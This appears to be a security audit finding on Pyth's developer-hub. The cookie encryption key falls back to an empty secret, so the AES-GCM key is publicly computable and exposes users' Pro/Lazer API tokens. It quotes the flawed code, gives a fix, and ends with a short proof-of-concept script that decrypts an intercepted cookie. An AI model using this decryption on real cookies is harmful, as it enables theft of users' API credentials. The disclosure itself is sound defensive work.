### Title
Empty-String Fallback Encryption Key Exposes Pyth Pro API Tokens in Cookie — (File: `apps/developer-hub/src/cookies/initialAccessTokenCookie.ts`)

### Summary

`initialAccessTokenCookie.ts` derives its AES-256-GCM cookie encryption key from `process.env.COOKIE_SIGNING_SECRET ?? ""`. When the environment variable is absent the password passed to `scryptSync` is the empty string `""`, producing a fully deterministic, publicly computable 32-byte key. Any `developer-playground-initial-access-token` cookie that can be read is therefore decryptable by anyone who has read the open-source repository, exposing the Pyth Pro / Lazer API access token stored inside it.

### Finding Description

In `apps/developer-hub/src/cookies/initialAccessTokenCookie.ts`:

```typescript
// line 13
const cookieSigningSecret = process.env.COOKIE_SIGNING_SECRET ?? "";

// line 22 – key is derived at module load time, once, for the lifetime of the process
const key = scryptSync(cookieSigningSecret, "pyth-hub", 32);
```

`scryptSync("", "pyth-hub", 32)` is a pure, deterministic function with no secret input. Its output is a fixed 32-byte value that any attacker can reproduce offline. The same `key` is then used for every `encrypt()` / `decrypt()` call:

```typescript
// line 26
const cipher = createCipheriv("aes-256-gcm", key, iv);
```

The cookie that is encrypted with this key carries the user's Pyth Pro / Lazer API access token:

```typescript
// line 70-79
c.set(
  INITIAL_ACCESS_TOKEN_COOKIE_NAME,
  encrypt(JSON.stringify(parsed.data)),   // parsed.data.initialAccessToken
  { httpOnly: true, maxAge: 60, path: "/playground", sameSite: "lax", secure: true }
);
```

The token is later read server-side and injected directly into the playground as the live credential:

```typescript
// PlaygroundPage/index.tsx line 12
const tokenData = await Cookies.getInitialAccessToken();
// ...
accessToken: tokenData?.initialAccessToken ?? "",
```

The deeplink endpoint that sets the cookie is publicly reachable with no authentication:

```typescript
// apps/developer-hub/src/app/api/playground/deeplink/route.ts line 5-7
export async function POST(request: NextRequest) {
  await Cookies.setInitialAccessToken(request);
  return NextResponse.redirect(new URL("/playground", request.url), { status: 303 });
}
```

### Impact Explanation

If `COOKIE_SIGNING_SECRET` is unset (or set to `""`) in the production deployment, the AES-256-GCM key is `scryptSync("", "pyth-hub", 32)` — a constant any reader of the public repository can compute. An attacker who obtains the raw cookie value (e.g., via TLS interception, server-side log leakage, or a separate XSS on a sibling path) can decrypt it and recover the victim's Pyth Pro API access token in plaintext. With that token the attacker can:

- Impersonate the victim against the Lazer price-feed streaming service.
- Exhaust the victim's rate-limit quota.
- Access real-time Lazer price data the victim is paying for.

### Likelihood Explanation

The `?? ""` fallback is the default code path when the environment variable is not configured. Because the repository is public, the exact key derivation parameters (`""`, `"pyth-hub"`, `32`) are known. The cookie is `httpOnly` and `secure`, which prevents trivial JavaScript theft, but the 60-second `maxAge` window, combined with any server-side log or proxy that records `Set-Cookie` headers, creates a realistic interception surface. The vulnerability requires no on-chain interaction and no privileged role — only the ability to read a cookie that was encrypted with a known-constant key.

### Recommendation

1. **Require the secret**: Replace the empty-string fallback with a hard failure at startup:
   ```typescript
   const cookieSigningSecret = process.env.COOKIE_SIGNING_SECRET;
   if (!cookieSigningSecret) throw new Error("COOKIE_SIGNING_SECRET must be set");
   ```
2. **Validate entropy**: Assert that the secret meets a minimum length/entropy requirement before deriving the key.
3. **Rotate on exposure**: Treat any deployment where `COOKIE_SIGNING_SECRET` was absent or empty as fully compromised and rotate all affected Pyth Pro API tokens.

### Proof of Concept

```typescript
import { scryptSync, createDecipheriv } from "node:crypto";

// Publicly known parameters from the open-source file
const key = scryptSync("", "pyth-hub", 32);

// Suppose the attacker intercepts the raw base64 cookie value:
const rawCookie = "<base64 value of developer-playground-initial-access-token>";
const data = Buffer.from(rawCookie, "base64");

const iv      = data.subarray(0, 16);
const authTag = data.subarray(16, 32);
const enc     = data.subarray(32);

const decipher = createDecipheriv("aes-256-gcm", key, iv);
decipher.setAuthTag(authTag);
const plaintext = decipher.update(enc) + decipher.final("utf8");

// plaintext === '{"initialAccessToken":"<victim Pyth Pro API key>"}'
console.log(plaintext);
```
